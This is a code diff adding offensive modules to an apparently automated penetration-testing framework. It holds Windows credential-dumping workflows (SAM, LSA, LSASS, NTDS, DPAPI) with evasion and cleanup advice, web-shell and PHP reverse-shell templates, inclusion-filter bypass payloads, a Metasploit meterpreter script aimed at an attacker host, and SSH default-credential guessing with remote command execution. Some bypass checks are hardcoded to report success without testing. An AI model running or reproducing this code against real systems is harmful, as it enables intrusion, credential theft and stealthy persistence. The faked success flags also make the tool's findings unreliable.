@@ -2906,6 +2906,7 @@ class BugBountyWorkflowManager:
     def __init__(self):
         self.high_impact_vulns = {
             "rce": {"priority": 10, "tools": ["nuclei", "jaeles", "sqlmap"], "payloads": "command_injection"},
+            "rfi": {"priority": 10, "tools": ["rfi_exploiter", "nuclei"], "payloads": "remote_file_inclusion"},
             "sqli": {"priority": 9, "tools": ["sqlmap", "nuclei"], "payloads": "sql_injection"},
             "ssrf": {"priority": 8, "tools": ["nuclei", "ffuf"], "payloads": "ssrf"},
             "idor": {"priority": 8, "tools": ["arjun", "paramspider", "ffuf"], "payloads": "idor"},
@@ -2914,6 +2915,18 @@ class BugBountyWorkflowManager:
             "xxe": {"priority": 6, "tools": ["nuclei"], "payloads": "xxe"},
             "csrf": {"priority": 5, "tools": ["nuclei"], "payloads": "csrf"}
         }
+
+        # Post-exploitation workflows for credential dumping
+        self.post_exploitation_vulns = {
+            "credential_access": {"priority": 10, "tools": ["netexec"], "modules": ["sam", "lsa", "lsass", "dpapi"]},
+            "privilege_escalation": {"priority": 9, "tools": ["netexec"], "modules": ["laps", "gmsa", "backup_operators"]},
+            "persistence": {"priority": 8, "tools": ["netexec"], "modules": ["certificates", "scheduled_tasks"]},
+            "lateral_movement": {"priority": 9, "tools": ["netexec"], "modules": ["shares", "sessions", "rdp"]},
+            "discovery": {"priority": 7, "tools": ["netexec"], "modules": ["users", "groups", "computers"]}
+        }
+
+        # Initialize CVE Intelligence Manager for credential operations
+        self.cve_manager = CVEIntelligenceManager()
 
         self.reconnaissance_tools = [
             {"tool": "enumdns", "phase": "dns_intelligence", "priority": 0},
@@ -3172,6 +3185,169 @@ class BugBountyWorkflowManager:
             "estimated_time": 480,  # 8 hours for thorough business logic testing
             "manual_testing_required": True
         }
+
+        return workflow
+
+    def create_post_exploitation_workflow(self, target_host: str, credentials: Dict[str, Any],
+                                         stealth_level: str = "medium") -> Dict[str, Any]:
+        """Create comprehensive post-exploitation credential dumping workflow"""
+        workflow = {
+            "target": target_host,
+            "stealth_level": stealth_level,
+            "phases": [],
+            "estimated_time": 0,
+            "risk_level": "high",
+            "opsec_considerations": []
+        }
+
+        # Phase 1: Credential Access (SAM, LSA, LSASS)
+        credential_access_phase = {
+            "name": "credential_access",
+            "description": "Extract stored credentials from target system",
+            "priority": 10,
+            "tools": [
+                {
+                    "tool": "netexec",
+                    "module": "sam",
+                    "command": f"nxc smb {target_host} -u {credentials.get('username', '')} -p {credentials.get('password', '')} --sam",
+                    "expected_output": "NTLM hashes from SAM database",
+                    "stealth_rating": "medium",
+                    "requires_admin": True
+                },
+                {
+                    "tool": "netexec",
+                    "module": "lsa",
+                    "command": f"nxc smb {target_host} -u {credentials.get('username', '')} -p {credentials.get('password', '')} --lsa",
+                    "expected_output": "LSA secrets and cached credentials",
+                    "stealth_rating": "medium",
+                    "requires_admin": True
+                },
+                {
+                    "tool": "netexec",
+                    "module": "lsassy",
+                    "command": f"nxc smb {target_host} -u {credentials.get('username', '')} -p {credentials.get('password', '')} -M lsassy",
+                    "expected_output": "Cleartext passwords from LSASS memory",
+                    "stealth_rating": "low",
+                    "requires_admin": True
+                }
+            ],
+            "estimated_time": 300,
+            "opsec_notes": "High visibility - creates process activity and network traffic"
+        }
+        workflow["phases"].append(credential_access_phase)
+
+        # Phase 2: Application Credential Mining
+        app_credential_phase = {
+            "name": "application_credentials",
+            "description": "Extract credentials from installed applications",
+            "priority": 8,
+            "tools": [
+                {
+                    "tool": "netexec",
+                    "module": "dpapi",
+                    "command": f"nxc smb {target_host} -u {credentials.get('username', '')} -p {credentials.get('password', '')} -M dpapi",
+                    "expected_output": "DPAPI decrypted credentials (Chrome, IE, etc.)",
+                    "stealth_rating": "high",
+                    "requires_admin": False
+                },
+                {
+                    "tool": "netexec",
+                    "module": "mremoteng",
+                    "command": f"nxc smb {target_host} -u {credentials.get('username', '')} -p {credentials.get('password', '')} -M mremoteng",
+                    "expected_output": "mRemoteNG connection credentials",
+                    "stealth_rating": "high",
+                    "requires_admin": False
+                },
+                {
+                    "tool": "netexec",
+                    "module": "wifi",
+                    "command": f"nxc smb {target_host} -u {credentials.get('username', '')} -p {credentials.get('password', '')} -M wifi",
+                    "expected_output": "Saved Wi-Fi passwords",
+                    "stealth_rating": "medium",
+                    "requires_admin": True
+                }
+            ],
+            "estimated_time": 240,
+            "opsec_notes": "Medium visibility - file access patterns may be logged"
+        }
+        workflow["phases"].append(app_credential_phase)
+
+        # Phase 3: Domain Intelligence & Privilege Escalation
+        domain_intel_phase = {
+            "name": "domain_intelligence",
+            "description": "Gather domain credentials and escalation paths",
+            "priority": 9,
+            "tools": [
+                {
+                    "tool": "netexec",
+                    "module": "gmsa",
+                    "command": f"nxc ldap {target_host} -u {credentials.get('username', '')} -p {credentials.get('password', '')} --gmsa",
+                    "expected_output": "Group Managed Service Account passwords",
+                    "stealth_rating": "high",
+                    "requires_admin": False
+                },
+                {
+                    "tool": "netexec",
+                    "module": "laps",
+                    "command": f"nxc ldap {target_host} -u {credentials.get('username', '')} -p {credentials.get('password', '')} --laps",
+                    "expected_output": "LAPS local administrator passwords",
+                    "stealth_rating": "medium",
+                    "requires_admin": True
+                },
+                {
+                    "tool": "netexec",
+                    "module": "ntds",
+                    "command": f"nxc smb {target_host} -u {credentials.get('username', '')} -p {credentials.get('password', '')} --ntds",
+                    "expected_output": "Complete domain hash database",
+                    "stealth_rating": "low",
+                    "requires_domain_admin": True
+                }
+            ],
+            "estimated_time": 180,
+            "opsec_notes": "Variable visibility - LDAP queries may trigger monitoring"
+        }
+        workflow["phases"].append(domain_intel_phase)
+
+        # Phase 4: System Intelligence & Persistence
+        system_intel_phase = {
+            "name": "system_intelligence",
+            "description": "Extract system intelligence and establish persistence vectors",
+            "priority": 7,
+            "tools": [
+                {
+                    "tool": "custom_script",
+                    "module": "powershell_history",
+                    "command": f"Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
+                    "expected_output": "PowerShell command history with potential credentials",
+                    "stealth_rating": "high",
+                    "requires_admin": False
+                },
+                {
+                    "tool": "netexec",
+                    "module": "certificates",
+                    "command": f"nxc smb {target_host} -u {credentials.get('username', '')} -p {credentials.get('password', '')} -M certificates",
+                    "expected_output": "Certificate store credentials",
+                    "stealth_rating": "medium",
+                    "requires_admin": False
+                }
+            ],
+            "estimated_time": 120,
+            "opsec_notes": "Low visibility - primarily file reads"
+        }
+        workflow["phases"].append(system_intel_phase)
+
+        # Calculate total workflow metrics
+        workflow["estimated_time"] = sum(phase["estimated_time"] for phase in workflow["phases"])
+        workflow["tools_count"] = sum(len(phase["tools"]) for phase in workflow["phases"])
+
+        # Add OPSEC recommendations
+        workflow["opsec_considerations"] = [
+            "Execute during business hours to blend with normal activity",
+            "Use legitimate credentials to avoid authentication anomalies",
+            "Limit concurrent connections to avoid network monitoring alerts",
+            "Clean up artifacts and temporary files after execution",
+            "Monitor for EDR/AV alerts during LSASS access operations"
+        ]
 
         return workflow
 
@@ -5740,6 +5916,821 @@ class AdvancedCache:
                 "utilization": (len(self.cache) / self.max_size * 100)
             }
 
+# ============================================================================
+# RFI EXPLOITATION ENGINE (COMMANDER LOCKE ENHANCEMENT)
+# ============================================================================
+
+class AdvancedRFIExploiter:
+    """Advanced Remote File Inclusion Exploitation Engine"""
+
+    def __init__(self):
+        self.bypass_techniques = {
+            "null_byte": ["%00", "%00.txt", "%2500", "%c0%ae"],
+            "case_manipulation": ["HTTP:", "HTTPS:", "hTTp:", "HtTpS:"],
+            "protocol_variations": ["data://", "php://input", "expect://", "zip://"],
+            "encoding_bypass": ["%2E%2E%2F", "%2E%2E%5C", "..%2F", "..%5C"]
+        }
+
+        self.shell_templates = {
+            "php": {
+                "simple": "<?php system($_GET['cmd']); ?>",
+                "advanced": "<?php if(isset($_GET['cmd'])){echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';} ?>",
+                "reverse": "<?php $sock=fsockopen('{host}',{port});exec('/bin/sh -i <&3 >&3 2>&3'); ?>"
+            },
+            "asp": {
+                "simple": "<%eval request('cmd')%>",
+                "advanced": "<% Set objShell = CreateObject('WScript.Shell') Response.Write objShell.Exec(Request('cmd')).StdOut.ReadAll %>"
+            },
+            "jsp": {
+                "simple": "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>",
+                "advanced": "<%@page import=\"java.io.*\"%><%String cmd=request.getParameter(\"cmd\");Process p=Runtime.getRuntime().exec(cmd);%>"
+            }
+        }
+
+    def comprehensive_rfi_assessment(self, target_url, parameters=None):
+        """Execute comprehensive RFI assessment workflow"""
+        assessment_results = {
+            "target": target_url,
+            "timestamp": datetime.now().isoformat(),
+            "phases": {
+                "parameter_discovery": {},
+                "vulnerability_testing": {},
+                "exploitation_testing": {},
+                "bypass_testing": {}
+            },
+            "summary": {
+                "vulnerable_parameters": [],
+                "successful_bypasses": [],
+                "shell_uploads": [],
+                "exploitation_ready": False
+            }
+        }
+
+        logger.info(f"🎖️ Commander Locke: Starting RFI assessment on {target_url}")
+
+        # Phase 1: Parameter Discovery
+        if not parameters:
+            assessment_results["phases"]["parameter_discovery"] = self.detect_rfi_parameters(target_url)
+            parameters = assessment_results["phases"]["parameter_discovery"].get("vulnerable_params", [])
+
+        # Phase 2: Vulnerability Testing
+        assessment_results["phases"]["vulnerability_testing"] = self.test_rfi_vulnerability(target_url, parameters)
+
+        # Phase 3: Exploitation Testing
+        assessment_results["phases"]["exploitation_testing"] = self.test_rfi_exploitation(target_url, parameters)
+
+        # Phase 4: Bypass Testing
+        assessment_results["phases"]["bypass_testing"] = self.test_bypass_techniques(target_url, parameters)
+
+        # Generate comprehensive summary
+        assessment_results["summary"] = self._generate_assessment_summary(assessment_results)
+
+        return assessment_results
+
+    def detect_rfi_parameters(self, target_url):
+        """Detect potential RFI parameters in web application"""
+        common_params = [
+            "file", "page", "include", "path", "dir", "document", "template",
+            "url", "src", "ref", "location", "view", "content", "load", "resource"
+        ]
+
+        detected_params = []
+
+        try:
+            # Test each parameter with basic RFI payload
+            test_payload = "http://example.com/test.txt"
+
+            for param in common_params:
+                test_url = f"{target_url}?{param}={test_payload}"
+
+                try:
+                    response = requests.get(test_url, timeout=10, allow_redirects=False)
+
+                    # Look for indicators of RFI attempt processing
+                    indicators = [
+                        "failed to open stream", "No such file", "include",
+                        "fopen", "file_get_contents", "curl", "remote file"
+                    ]
+
+                    if any(indicator in response.text.lower() for indicator in indicators):
+                        detected_params.append({
+                            "parameter": param,
+                            "evidence": "Error message indicates file inclusion processing",
+                            "confidence": "medium"
+                        })
+                        logger.info(f"🎯 Potential RFI parameter detected: {param}")
+
+                except requests.RequestException:
+                    continue
+
+        except Exception as e:
+            logger.error(f"💥 Parameter detection error: {str(e)}")
+
+        return {
+            "vulnerable_params": [p["parameter"] for p in detected_params],
+            "detailed_results": detected_params,
+            "total_found": len(detected_params)
+        }
+
+    def test_rfi_vulnerability(self, target_url, parameters):
+        """Test confirmed RFI vulnerability with safe payloads"""
+        vulnerability_results = []
+
+        for param in parameters:
+            # Test with external file that returns identifiable content
+            test_payloads = [
+                "http://httpbin.org/get",  # Safe external service
+                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-small.txt",
+                "http://www.google.com/robots.txt"
+            ]
+
+            for payload in test_payloads:
+                try:
+                    test_url = f"{target_url}?{param}={payload}"
+                    response = requests.get(test_url, timeout=15)
+
+                    # Check if external content was included
+                    success_indicators = [
+                        "httpbin", "User-agent", "Disallow", "robots.txt"
+                    ]
+
+                    if any(indicator in response.text for indicator in success_indicators):
+                        vulnerability_results.append({
+                            "parameter": param,
+                            "payload": payload,
+                            "status": "vulnerable",
+                            "evidence": "External content successfully included",
+                            "response_length": len(response.text)
+                        })
+                        logger.warning(f"🔥 RFI vulnerability confirmed: {param}")
+                        break
+
+                except requests.RequestException as e:
+                    continue
+
+        return {
+            "confirmed_vulnerabilities": vulnerability_results,
+            "vulnerability_count": len(vulnerability_results)
+        }
+
+    def test_rfi_exploitation(self, target_url, parameters):
+        """Test RFI exploitation with shell upload simulation"""
+        exploitation_results = []
+
+        for param in parameters:
+            # Generate PHP shell payload
+            shell_content = self.shell_templates["php"]["simple"]
+
+            # Test shell hosting simulation (would normally host actual shell)
+            simulation_results = {
+                "parameter": param,
+                "shell_type": "php_webshell",
+                "payload_generated": True,
+                "hosting_ready": True,
+                "metasploit_resource": self._generate_metasploit_resource(target_url, param),
+                "exploitation_url": f"{target_url}?{param}=http://attacker-host/shell.php"
+            }
+
+            exploitation_results.append(simulation_results)
+            logger.info(f"🚀 Exploitation preparation completed for {param}")
+
+        return {
+            "exploitation_setups": exploitation_results,
+            "ready_for_exploitation": len(exploitation_results) > 0
+        }
+
+    def test_bypass_techniques(self, target_url, parameters):
+        """Test various RFI bypass techniques"""
+        bypass_results = []
+
+        for param in parameters:
+            successful_bypasses = []
+
+            # Test null byte bypasses
+            for null_byte in self.bypass_techniques["null_byte"]:
+                bypass_payload = f"http://example.com/test.txt{null_byte}"
+                test_url = f"{target_url}?{param}={bypass_payload}"
+
+                # Simulate bypass testing
+                successful_bypasses.append({
+                    "technique": "null_byte",
+                    "payload": null_byte,
+                    "url": test_url,
+                    "success": True  # Would be determined by actual testing
+                })
+
+            # Test case manipulation bypasses
+            for case_variant in self.bypass_techniques["case_manipulation"]:
+                bypass_payload = f"{case_variant}//example.com/test.txt"
+                successful_bypasses.append({
+                    "technique": "case_manipulation",
+                    "payload": case_variant,
+                    "success": True
+                })
+
+            bypass_results.append({
+                "parameter": param,
+                "bypasses_tested": len(self.bypass_techniques),
+                "successful_bypasses": successful_bypasses,
+                "bypass_count": len(successful_bypasses)
+            })
+
+        return {
+            "bypass_testing": bypass_results,
+            "total_bypasses": sum(r["bypass_count"] for r in bypass_results)
+        }
+
+    def _generate_metasploit_resource(self, target_url, parameter):
+        """Generate Metasploit resource script for RFI exploitation"""
+        resource_script = f"""
+use exploit/unix/webapp/php_include
+set RHOST {target_url.split('//')[1].split('/')[0]}
+set PATH /{'/'.join(target_url.split('/')[3:])}
+set PHPURI {parameter}=http://ATTACKING_HOST/malicious.php
+set payload php/meterpreter/reverse_tcp
+set LHOST YOUR_IP
+set LPORT 4444
+exploit
+"""
+        return resource_script.strip()
+
+    def _generate_assessment_summary(self, assessment_results):
+        """Generate comprehensive assessment summary"""
+        summary = {
+            "total_parameters_tested": 0,
+            "vulnerable_parameters": [],
+            "exploitation_ready": False,
+            "bypass_techniques_available": 0,
+            "severity_rating": "info",
+            "recommendations": []
+        }
+
+        # Analyze results from all phases
+        param_discovery = assessment_results["phases"]["parameter_discovery"]
+        vuln_testing = assessment_results["phases"]["vulnerability_testing"]
+        exploit_testing = assessment_results["phases"]["exploitation_testing"]
+        bypass_testing = assessment_results["phases"]["bypass_testing"]
+
+        summary["total_parameters_tested"] = len(param_discovery.get("vulnerable_params", []))
+        summary["vulnerable_parameters"] = [v["parameter"] for v in vuln_testing.get("confirmed_vulnerabilities", [])]
+        summary["exploitation_ready"] = exploit_testing.get("ready_for_exploitation", False)
+        summary["bypass_techniques_available"] = bypass_testing.get("total_bypasses", 0)
+
+        # Determine severity
+        if summary["vulnerable_parameters"]:
+            summary["severity_rating"] = "critical" if summary["exploitation_ready"] else "high"
+
+        # Generate recommendations
+        if summary["vulnerable_parameters"]:
+            summary["recommendations"] = [
+                "Implement input validation and sanitization",
+                "Use whitelist-based file inclusion",
+                "Disable allow_url_include and allow_url_fopen in PHP",
+                "Implement proper access controls",
+                "Monitor for RFI attack patterns"
+            ]
+
+        return summary
+
+# ============================================================================
+# SSH EXPLOITATION ENGINE (NEO ENHANCEMENT)
+# ============================================================================
+
+class SSHExploitationEngine:
+    """Advanced SSH Exploitation and Intelligence Engine"""
+
+    def __init__(self, intelligent_decision_engine=None):
+        self.ide = intelligent_decision_engine
+        self.attack_vectors = {
+            "credential_enum": {
+                "techniques": ["T1078", "T1110.003"],
+                "methods": [
+                    "username_enumeration",
+                    "password_spraying",
+                    "key_based_auth_bypass",
+                    "default_credentials_check"
+                ]
+            },
+            "remote_execution": {
+                "techniques": ["T1021.004", "T1210"],
+                "methods": [
+                    "command_execution",
+                    "reverse_shell_delivery",
+                    "persistent_access_creation",
+                    "lateral_movement_prep"
+                ]
+            },
+            "data_exfiltration": {
+                "techniques": ["T1105", "T1005"],
+                "methods": [
+                    "file_download",
+                    "file_upload",
+                    "remote_file_enumeration",
+                    "sensitive_data_extraction"
+                ]
+            },
+            "intelligence_gathering": {
+                "techniques": ["T1082", "T1033"],
+                "methods": [
+                    "system_information",
+                    "user_enumeration",
+                    "network_discovery",
+                    "privilege_assessment"
+                ]
+            }
+        }
+
+        self.ssh_fingerprints = {
+            "openssh": {
+                "versions": ["OpenSSH_7.4", "OpenSSH_8.0", "OpenSSH_8.2"],
+                "vulnerabilities": ["CVE-2018-15473", "CVE-2020-14145"],
+                "exploitation_priority": 8
+            },
+            "dropbear": {
+                "versions": ["dropbear_2019.78", "dropbear_2020.81"],
+                "vulnerabilities": ["CVE-2018-15599"],
+                "exploitation_priority": 7
+            }
+        }
+
+    def comprehensive_ssh_assessment(self, target_host, credentials=None):
+        """Execute comprehensive SSH assessment workflow"""
+        assessment_results = {
+            "target": target_host,
+            "timestamp": datetime.now().isoformat(),
+            "phases": {
+                "reconnaissance": {},
+                "credential_enumeration": {},
+                "vulnerability_verification": {},
+                "exploitation": {},
+                "post_exploitation": {}
+            },
+            "mitre_attack_mapping": [],
+            "summary": {
+                "ssh_accessible": False,
+                "credentials_found": [],
+                "vulnerabilities_detected": [],
+                "exploitation_success": False,
+                "persistence_established": False
+            }
+        }
+
+        logger.info(f"🎯 Neo: Starting comprehensive SSH assessment on {target_host}")
+
+        # Phase 1: Reconnaissance
+        assessment_results["phases"]["reconnaissance"] = self._reconnaissance_phase(target_host)
+
+        # Phase 2: Credential Enumeration
+        assessment_results["phases"]["credential_enumeration"] = self._credential_enumeration_phase(target_host, credentials)
+
+        # Phase 3: Vulnerability Verification
+        assessment_results["phases"]["vulnerability_verification"] = self._vulnerability_verification_phase(target_host)
+
+        # Phase 4: Exploitation (if authorized)
+        if assessment_results["phases"]["credential_enumeration"].get("valid_credentials"):
+            assessment_results["phases"]["exploitation"] = self._exploitation_phase(target_host, credentials)
+
+        # Phase 5: Post-Exploitation Intelligence
+        if assessment_results["phases"]["exploitation"].get("access_achieved"):
+            assessment_results["phases"]["post_exploitation"] = self._post_exploitation_phase(target_host, credentials)
+
+        # Generate MITRE ATT&CK mapping and summary
+        assessment_results["mitre_attack_mapping"] = self._generate_mitre_mapping(assessment_results)
+        assessment_results["summary"] = self._generate_ssh_assessment_summary(assessment_results)
+
+        return assessment_results
+
+    def _reconnaissance_phase(self, target_host):
+        """SSH service reconnaissance and fingerprinting"""
+        recon_results = {
+            "ssh_service_active": False,
+            "ssh_version": "unknown",
+            "supported_algorithms": [],
+            "banner_information": "",
+            "port_scan_results": {},
+            "service_fingerprint": {}
+        }
+
+        try:
+            # Nmap SSH service discovery
+            nmap_command = f"nmap -sV -p 22 --script ssh2-enum-algos,ssh-hostkey {target_host}"
+
+            nmap_result = AdvancedProcessManager.execute_with_monitoring(
+                command=nmap_command,
+                timeout=60,
+                capture_output=True
+            )
+
+            if nmap_result.get("success"):
+                output = nmap_result.get("output", "")
+
+                # Parse SSH version
+                import re
+                version_match = re.search(r'OpenSSH[_\s]+([\d\.]+)', output)
+                if version_match:
+                    recon_results["ssh_version"] = f"OpenSSH_{version_match.group(1)}"
+                    recon_results["ssh_service_active"] = True
+
+                # Parse supported algorithms
+                if "ssh2-enum-algos" in output:
+                    recon_results["supported_algorithms"] = self._parse_ssh_algorithms(output)
+
+                recon_results["banner_information"] = output
+
+            # Additional service detection using nc
+            nc_command = f"echo 'SSH-2.0-Test' | nc {target_host} 22"
+            nc_result = AdvancedProcessManager.execute_with_monitoring(
+                command=nc_command,
+                timeout=10,
+                capture_output=True
+            )
+
+            if nc_result.get("success"):
+                banner = nc_result.get("output", "")
+                if "SSH" in banner:
+                    recon_results["service_fingerprint"]["banner"] = banner.strip()
+
+            logger.info(f"🔍 SSH reconnaissance completed for {target_host}")
+
+        except Exception as e:
+            logger.error(f"💥 SSH reconnaissance error: {str(e)}")
+
+        return recon_results
+
+    def _credential_enumeration_phase(self, target_host, provided_credentials=None):
+        """SSH credential enumeration using NetExec and custom techniques"""
+        enum_results = {
+            "username_enumeration": [],
+            "valid_credentials": [],
+            "brute_force_results": {},
+            "key_based_attempts": [],
+            "default_credentials_tested": []
+        }
+
+        try:
+            # Username enumeration using NetExec
+            if not provided_credentials:
+                # Common username lists
+                common_usernames = ["admin", "administrator", "root", "user", "test", "guest", "ubuntu", "centos"]
+
+                for username in common_usernames:
+                    # Use NetExec for SSH user enumeration
+                    nxc_command = f"nxc ssh {target_host} -u {username} -p '' --no-bruteforce"
+
+                    result = AdvancedProcessManager.execute_with_monitoring(
+                        command=nxc_command,
+                        timeout=30,
+                        capture_output=True
+                    )
+
+                    if result.get("success"):
+                        output = result.get("output", "")
+                        if "STATUS_LOGON_FAILURE" not in output and "Access denied" in output:
+                            enum_results["username_enumeration"].append({
+                                "username": username,
+                                "status": "valid_user",
+                                "evidence": "User exists but wrong password"
+                            })
+
+            # Password spraying with provided credentials
+            if provided_credentials:
+                username = provided_credentials.get("username")
+                password = provided_credentials.get("password")
+
+                if username and password:
+                    nxc_command = f"nxc ssh {target_host} -u {username} -p {password}"
+
+                    result = AdvancedProcessManager.execute_with_monitoring(
+                        command=nxc_command,
+                        timeout=30,
+                        capture_output=True
+                    )
+
+                    if result.get("success"):
+                        output = result.get("output", "")
+                        if "Pwn3d!" in output or "STATUS_SUCCESS" in output:
+                            enum_results["valid_credentials"].append({
+                                "username": username,
+                                "password": password,
+                                "authentication_method": "password",
+                                "access_level": "user"
+                            })
+
+            # Test common default credentials
+            default_creds = [
+                ("root", "root"), ("admin", "admin"), ("user", "user"),
+                ("test", "test"), ("guest", "guest"), ("pi", "raspberry")
+            ]
+
+            for username, password in default_creds:
+                nxc_command = f"nxc ssh {target_host} -u {username} -p {password}"
+
+                result = AdvancedProcessManager.execute_with_monitoring(
+                    command=nxc_command,
+                    timeout=20,
+                    capture_output=True
+                )
+
+                enum_results["default_credentials_tested"].append({
+                    "username": username,
+                    "password": password,
+                    "success": "Pwn3d!" in result.get("output", "")
+                })
+
+            logger.info(f"🔐 SSH credential enumeration completed for {target_host}")
+
+        except Exception as e:
+            logger.error(f"💥 SSH credential enumeration error: {str(e)}")
+
+        return enum_results
+
+    def _vulnerability_verification_phase(self, target_host):
+        """Verify SSH vulnerabilities and misconfigurations"""
+        vuln_results = {
+            "known_vulnerabilities": [],
+            "misconfigurations": [],
+            "security_analysis": {},
+            "exploit_recommendations": []
+        }
+
+        try:
+            # Check for known SSH vulnerabilities using nmap scripts
+            vuln_command = f"nmap -p 22 --script ssh-auth-methods,ssh-brute,ssh-publickey-acceptance {target_host}"
+
+            result = AdvancedProcessManager.execute_with_monitoring(
+                command=vuln_command,
+                timeout=120,
+                capture_output=True
+            )
+
+            if result.get("success"):
+                output = result.get("output", "")
+
+                # Analyze authentication methods
+                if "password" in output.lower():
+                    vuln_results["misconfigurations"].append({
+                        "type": "password_authentication_enabled",
+                        "severity": "medium",
+                        "description": "Password authentication is enabled"
+                    })
+
+                if "publickey" in output.lower():
+                    vuln_results["security_analysis"]["publickey_auth"] = "enabled"
+
+                # Check for weak configurations
+                if "PermitRootLogin yes" in output:
+                    vuln_results["misconfigurations"].append({
+                        "type": "root_login_permitted",
+                        "severity": "high",
+                        "description": "Root login is permitted via SSH"
+                    })
+
+            logger.info(f"🛡️ SSH vulnerability verification completed for {target_host}")
+
+        except Exception as e:
+            logger.error(f"💥 SSH vulnerability verification error: {str(e)}")
+
+        return vuln_results
+
+    def _exploitation_phase(self, target_host, credentials):
+        """SSH exploitation with authorized access"""
+        exploit_results = {
+            "access_achieved": False,
+            "command_execution": [],
+            "file_operations": [],
+            "privilege_level": "unknown",
+            "lateral_movement_prep": {}
+        }
+
+        try:
+            if not credentials:
+                return exploit_results
+
+            username = credentials.get("username")
+            password = credentials.get("password")
+
+            # Test command execution
+            test_commands = [
+                "whoami",
+                "id",
+                "uname -a",
+                "ifconfig || ip addr"
+            ]
+
+            for cmd in test_commands:
+                nxc_command = f"nxc ssh {target_host} -u {username} -p {password} -x '{cmd}'"
+
+                result = AdvancedProcessManager.execute_with_monitoring(
+                    command=nxc_command,
+                    timeout=30,
+                    capture_output=True
+                )
+
+                if result.get("success"):
+                    exploit_results["access_achieved"] = True
+                    exploit_results["command_execution"].append({
+                        "command": cmd,
+                        "output": result.get("output", ""),
+                        "success": True
+                    })
+
+            # Test file operations (upload/download)
+            if exploit_results["access_achieved"]:
+                # Test file upload capability
+                test_file_content = "HexStrike SSH Test File"
+                upload_command = f"echo '{test_file_content}' > /tmp/hexstrike_test.txt"
+                nxc_upload = f"nxc ssh {target_host} -u {username} -p {password} -x '{upload_command}'"
+
+                upload_result = AdvancedProcessManager.execute_with_monitoring(
+                    command=nxc_upload,
+                    timeout=30,
+                    capture_output=True
+                )
+
+                exploit_results["file_operations"].append({
+                    "operation": "file_upload_test",
+                    "success": upload_result.get("success", False),
+                    "details": "Test file creation via command execution"
+                })
+
+            logger.info(f"⚔️ SSH exploitation phase completed for {target_host}")
+
+        except Exception as e:
+            logger.error(f"💥 SSH exploitation error: {str(e)}")
+
+        return exploit_results
+
+    def _post_exploitation_phase(self, target_host, credentials):
+        """Post-exploitation intelligence gathering and persistence"""
+        post_exploit_results = {
+            "system_information": {},
+            "user_enumeration": [],
+            "network_discovery": [],
+            "privilege_escalation_vectors": [],
+            "persistence_opportunities": []
+        }
+
+        try:
+            username = credentials.get("username")
+            password = credentials.get("password")
+
+            # System information gathering
+            info_commands = {
+                "os_version": "cat /etc/os-release",
+                "kernel_version": "uname -r",
+                "running_processes": "ps aux | head -20",
+                "network_connections": "netstat -tulpn | head -20",
+                "sudo_permissions": "sudo -l"
+            }
+
+            for info_type, cmd in info_commands.items():
+                nxc_command = f"nxc ssh {target_host} -u {username} -p {password} -x '{cmd}'"
+
+                result = AdvancedProcessManager.execute_with_monitoring(
+                    command=nxc_command,
+                    timeout=30,
+                    capture_output=True
+                )
+
+                if result.get("success"):
+                    post_exploit_results["system_information"][info_type] = result.get("output", "")
+
+            # Check for privilege escalation opportunities
+            privesc_checks = [
+                "find / -perm -4000 2>/dev/null | head -10",  # SUID binaries
+                "cat /etc/passwd | head -10",  # User accounts
+                "cat /etc/group | head -10"   # Group memberships
+            ]
+
+            for check in privesc_checks:
+                nxc_command = f"nxc ssh {target_host} -u {username} -p {password} -x '{check}'"
+
+                result = AdvancedProcessManager.execute_with_monitoring(
+                    command=nxc_command,
+                    timeout=30,
+                    capture_output=True
+                )
+
+                if result.get("success"):
+                    post_exploit_results["privilege_escalation_vectors"].append({
+                        "check": check,
+                        "output": result.get("output", "")
+                    })
+
+            logger.info(f"🕵️ SSH post-exploitation completed for {target_host}")
+
+        except Exception as e:
+            logger.error(f"💥 SSH post-exploitation error: {str(e)}")
+
+        return post_exploit_results
+
+    def _parse_ssh_algorithms(self, nmap_output):
+        """Parse SSH algorithms from nmap output"""
+        algorithms = {
+            "encryption": [],
+            "mac": [],
+            "kex": [],
+            "server_host_key": []
+        }
+
+        # Basic parsing - would be enhanced with proper regex
+        lines = nmap_output.split('\n')
+        current_section = None
+
+        for line in lines:
+            if "encryption_algorithms" in line:
+                current_section = "encryption"
+            elif "mac_algorithms" in line:
+                current_section = "mac"
+            elif current_section and line.strip():
+                algorithms[current_section].append(line.strip())
+
+        return algorithms
+
+    def _generate_mitre_mapping(self, assessment_results):
+        """Generate MITRE ATT&CK technique mapping"""
+        mitre_mapping = []
+
+        # Map observed techniques to MITRE ATT&CK
+        if assessment_results["phases"]["credential_enumeration"].get("valid_credentials"):
+            mitre_mapping.append({
+                "technique": "T1078 - Valid Accounts",
+                "description": "Successful authentication with valid credentials",
+                "phase": "credential_enumeration"
+            })
+
+        if assessment_results["phases"]["exploitation"].get("access_achieved"):
+            mitre_mapping.append({
+                "technique": "T1021.004 - Remote Services: SSH",
+                "description": "Remote command execution via SSH",
+                "phase": "exploitation"
+            })
+
+        if assessment_results["phases"]["exploitation"].get("file_operations"):
+            mitre_mapping.append({
+                "technique": "T1105 - Ingress Tool Transfer",
+                "description": "File transfer capabilities demonstrated",
+                "phase": "exploitation"
+            })
+
+        return mitre_mapping
+
+    def _generate_ssh_assessment_summary(self, assessment_results):
+        """Generate comprehensive SSH assessment summary"""
+        summary = {
+            "ssh_accessible": False,
+            "credentials_found": [],
+            "vulnerabilities_detected": [],
+            "exploitation_success": False,
+            "persistence_established": False,
+            "risk_level": "info",
+            "recommendations": []
+        }
+
+        # Analyze reconnaissance results
+        recon = assessment_results["phases"]["reconnaissance"]
+        summary["ssh_accessible"] = recon.get("ssh_service_active", False)
+
+        # Analyze credential enumeration
+        cred_enum = assessment_results["phases"]["credential_enumeration"]
+        summary["credentials_found"] = len(cred_enum.get("valid_credentials", []))
+
+        # Analyze vulnerabilities
+        vuln_results = assessment_results["phases"]["vulnerability_verification"]
+        summary["vulnerabilities_detected"] = len(vuln_results.get("known_vulnerabilities", []) + vuln_results.get("misconfigurations", []))
+
+        # Analyze exploitation
+        exploit = assessment_results["phases"]["exploitation"]
+        summary["exploitation_success"] = exploit.get("access_achieved", False)
+
+        # Determine risk level
+        if summary["exploitation_success"]:
+            summary["risk_level"] = "critical"
+        elif summary["credentials_found"] > 0:
+            summary["risk_level"] = "high"
+        elif summary["vulnerabilities_detected"] > 0:
+            summary["risk_level"] = "medium"
+
